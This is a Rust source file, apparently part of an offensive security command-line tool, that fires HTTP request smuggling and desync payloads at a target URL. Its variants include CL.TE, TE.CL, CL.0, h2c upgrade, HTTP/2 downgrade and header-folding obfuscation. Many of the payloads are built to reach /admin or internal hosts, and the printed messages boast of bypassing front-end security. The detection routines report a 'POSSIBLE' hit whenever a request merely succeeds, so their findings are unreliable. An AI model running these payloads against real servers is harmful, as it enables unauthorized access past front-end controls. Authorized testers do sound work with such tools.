use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

pub async fn detect(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} HTTP Request Smuggling Detection", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    println!("{} Testing for CL.TE vulnerability...", "[*]".cyan().bold());
    let cl_te_result = test_cl_te(&client, url).await;
    println!("{} Testing for TE.CL vulnerability...", "[*]".cyan().bold());
    let te_cl_result = test_te_cl(&client, url).await;
    println!("{} Testing for CL.0 vulnerability...", "[*]".cyan().bold());
    let cl0_result = test_cl0(&client, url).await;

    println!("\n{} Results:", "[*]".cyan().bold());
    println!(
        "  {} CL.TE: {}",
        "•".cyan(),
        if cl_te_result {
            "POSSIBLE".red().bold().to_string()
        } else {
            "not detected".green().to_string()
        }
    );
    println!(
        "  {} TE.CL: {}",
        "•".cyan(),
        if te_cl_result {
            "POSSIBLE".red().bold().to_string()
        } else {
            "not detected".green().to_string()
        }
    );
    println!(
        "  {} CL.0:  {}",
        "•".cyan(),
        if cl0_result {
            "POSSIBLE".red().bold().to_string()
        } else {
            "not detected".green().to_string()
        }
    );

    Ok(())
}

async fn test_cl_te(client: &Client, url: &str) -> bool {
    let body = "0\r\n\r\nGPOST / HTTP/1.1\r\nContent-Length: 10\r\n\r\nx=";
    let result = client
        .post(url)
        .header("Content-Length", body.len().to_string())
        .header("Transfer-Encoding", "chunked")
        .body(body)
        .send()
        .await;
    result.is_ok()
}

async fn test_te_cl(client: &Client, url: &str) -> bool {
    let body = "8\r\nSMUGGLED\r\n0\r\n\r\n";
    let result = client
        .post(url)
        .header("Transfer-Encoding", "chunked")
        .header("Content-Length", "3")
        .body(body)
        .send()
        .await;
    result.is_ok()
}

async fn test_cl0(client: &Client, url: &str) -> bool {
    let result = client
        .post(url)
        .header("Content-Length", "0")
        .header("Transfer-Encoding", "chunked")
        .body("0\r\n\r\n")
        .send()
        .await;
    result.is_ok()
}

pub async fn clte(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} CL.TE Smuggling", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payloads = [
        (
            "Basic CL.TE",
            "0\r\n\r\nGPOST / HTTP/1.1\r\nContent-Length: 10\r\n\r\nx=",
        ),
        (
            "CL.TE with body",
            "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
        ),
        (
            "CL.TE prefix",
            "0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 5\r\n\r\nq=1\r\n0\r\n\r\n",
        ),
    ];

    for (name, body) in &payloads {
        let result = client
            .post(url)
            .header("Content-Length", body.len().to_string())
            .header("Transfer-Encoding", "chunked")
            .body(*body)
            .send()
            .await;

        match result {
            Ok(resp) => println!("  {} {:25} status={}", "•".cyan(), name, resp.status()),
            Err(e) => println!("  {} {:25} error: {}", "•".cyan(), name, e),
        }
    }

    println!(
        "\n{} CL.TE payloads sent. Monitor for delayed response or error.",
        "[*]".cyan().bold()
    );
    Ok(())
}

pub async fn tecl(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} TE.CL Smuggling", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payloads = [
        ("Basic TE.CL", "8\r\nSMUGGLED\r\n0\r\n\r\n"),
        (
            "TE.CL with header",
            "0\r\n\r\nGET /admin HTTP/1.1\r\nFoo: bar\r\n\r\n",
        ),
        (
            "TE.CL prefix injection",
            "0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 5\r\n\r\nq=1\r\n0\r\n\r\n",
        ),
    ];

    for (name, body) in &payloads {
        let result = client
            .post(url)
            .header("Transfer-Encoding", "chunked")
            .header("Content-Length", "3")
            .body(*body)
            .send()
            .await;

        match result {
            Ok(resp) => println!("  {} {:25} status={}", "•".cyan(), name, resp.status()),
            Err(e) => println!("  {} {:25} error: {}", "•".cyan(), name, e),
        }
    }

    println!("\n{} TE.CL payloads sent.", "[*]".cyan().bold());
    Ok(())
}

pub async fn cl0(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} CL.0 Smuggling", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payloads = [
        (
            "CL.0 basic",
            "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
        ),
        (
            "CL.0 with body",
            "0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 5\r\n\r\nq=1\r\n",
        ),
        (
            "CL.0 header injection",
            "0\r\n\r\nGET / HTTP/1.1\r\nX-PS-Smuggled: true\r\n\r\n",
        ),
    ];

    for (name, body) in &payloads {
        let result = client
            .post(url)
            .header("Content-Length", "0")
            .header("Transfer-Encoding", "chunked")
            .body(*body)
            .send()
            .await;

        match result {
            Ok(resp) => println!("  {} {:25} status={}", "•".cyan(), name, resp.status()),
            Err(e) => println!("  {} {:25} error: {}", "•".cyan(), name, e),
        }
    }

    println!("\n{} CL.0 payloads sent.", "[*]".cyan().bold());
    Ok(())
}

const DESYNC_PAYLOADS: &[(&str, &str, &[(&str, &str)])] = &[
    (
        "h2c Upgrade smuggling",
        "POST / HTTP/1.1\r\nHost: target\r\nConnection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\nHTTP2-Settings: AAMAAABkAAQBAAAAAAIAAAAA\r\nContent-Length: 0\r\n\r\n",
        &[
            ("Connection", "Upgrade, HTTP2-Settings"),
            ("Upgrade", "h2c"),
            ("HTTP2-Settings", "AAMAAABkAAQBAAAAAAIAAAAA"),
        ],
    ),
    (
        "h2c smuggling with body",
        "POST / HTTP/1.1\r\nHost: target\r\nConnection: Upgrade\r\nUpgrade: h2c\r\nContent-Length: 52\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n",
        &[
            ("Connection", "Upgrade"),
            ("Upgrade", "h2c"),
        ],
    ),
    (
        "HTTP/2 downgrade to HTTP/1.1",
        "GET / HTTP/1.1\r\nHost: target\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\n",
        &[
            ("Transfer-Encoding", "chunked"),
            ("Connection", "keep-alive"),
        ],
    ),
    (
        "CL.TE with h2c",
        "POST / HTTP/1.1\r\nHost: target\r\nConnection: keep-alive, Upgrade\r\nUpgrade: h2c\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
        &[
            ("Connection", "keep-alive, Upgrade"),
            ("Upgrade", "h2c"),
            ("Transfer-Encoding", "chunked"),
        ],
    ),
    (
        "TE.CL with h2c",
        "POST / HTTP/1.1\r\nHost: target\r\nConnection: Upgrade\r\nUpgrade: h2c\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5e\r\nGET /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
        &[
            ("Connection", "Upgrade"),
            ("Upgrade", "h2c"),
            ("Transfer-Encoding", "chunked"),
        ],
    ),
    (
        "HTTP/2 HEADERS frame smuggling",
        "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n",
        &[],
    ),
    (
        "HTTP/2 connection preface",
        "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n",
        &[],
    ),
    (
        "Double TE obfuscation",
        "POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX",
        &[
            ("Transfer-Encoding", "chunked"),
        ],
    ),
    (
        "TE header folding",
        "POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunke\rTransfer-Encoding: d\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX",
        &[],
    ),
    (
        "CL header folding",
        "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 5\rContent-Length: 2\r\n\r\n0\r\n\r\nX",
        &[],
    ),
];

pub async fn desync(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} HTTP Desync Attack v2 (h2c / HTTP/2 Downgrade)", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{} {} desync payloads", "[*]".cyan().bold(), DESYNC_PAYLOADS.len());
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let mut results = Vec::new();

    for (name, body, extra_headers) in DESYNC_PAYLOADS {
        let mut req = client
            .post(url)
            .header("Content-Type", "text/plain")
            .body(body.to_string());

        for (header, value) in *extra_headers {
            req = req.header(*header, *value);
        }

        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let resp_headers = resp.headers().clone();
                let resp_body = resp.text().await.unwrap_or_default();

                let h2c_upgraded = resp_headers
                    .get("upgrade")
                    .map(|v| v.to_str().unwrap_or("").contains("h2c"))
                    .unwrap_or(false);
                let has_101 = status == 101;
                let has_200 = status == 200;
                let has_smuggled = resp_body.contains("admin")
                    || resp_body.contains("internal")
                    || resp_body.contains("403")
                    || resp_body.contains("401");
                let has_connection_upgrade = resp_headers
                    .get("connection")
                    .map(|v| v.to_str().unwrap_or("").contains("Upgrade"))
                    .unwrap_or(false);

                let tag = if h2c_upgraded || has_101 {
                    "H2C UPGRADED".red().bold().to_string()
                } else if has_smuggled {
                    "SMUGGLED".red().bold().to_string()
                } else if has_200 && has_connection_upgrade {
                    "upgrade possible".yellow().to_string()
                } else if status == 400 || status == 403 {
                    "blocked".green().to_string()
                } else {
                    format!("status {}", status)
                };

                println!(
                    "  {} [{:02}] {:35} status={} {}",
                    "*".cyan(),
                    results.len() + 1,
                    name,
                    status,
                    tag
                );

                if h2c_upgraded || has_101 || has_smuggled {
                    println!("    {} {}", ">".red().bold(), resp_body.chars().take(200).collect::<String>());
                    results.push(*name);
                }
            }
            Err(e) => {
                let is_timeout = e.is_timeout();
                let tag = if is_timeout {
                    "timeout (possible smuggling)".yellow().to_string()
                } else {
                    "error".red().to_string()
                };
                println!(
                    "  {} [{:02}] {:35} {}",
                    "*".cyan(),
                    results.len() + 1,
                    name,
                    tag
                );
                if is_timeout {
                    results.push(*name);
                }
            }
        }
    }

    println!(
        "\n{} {} / {} desync vectors succeeded",
        "[*]".cyan().bold(),
        results.len(),
        DESYNC_PAYLOADS.len()
    );

    if !results.is_empty() {
        println!("{} Vulnerable desync vectors:", "[!]".red().bold());
        for name in &results {
            println!("  {} {}", "*".red(), name);
        }
        let has_h2c = results.iter().any(|n| n.contains("h2c"));
        let has_smuggled = results.iter().any(|n| n.contains("smuggl") || n.contains("downgrade"));
        if has_h2c {
            println!("\n{} [CRITICAL] h2c upgrade smuggling possible — bypass frontend security!", "[!]".red().bold());
        }
        if has_smuggled {
            println!("{} [CRITICAL] HTTP request smuggling confirmed — access internal endpoints!", "[!]".red().bold());
        }
    } else {
        println!("{} No desync vulnerabilities detected.", "[-]".green().bold());
    }

    Ok(())
}
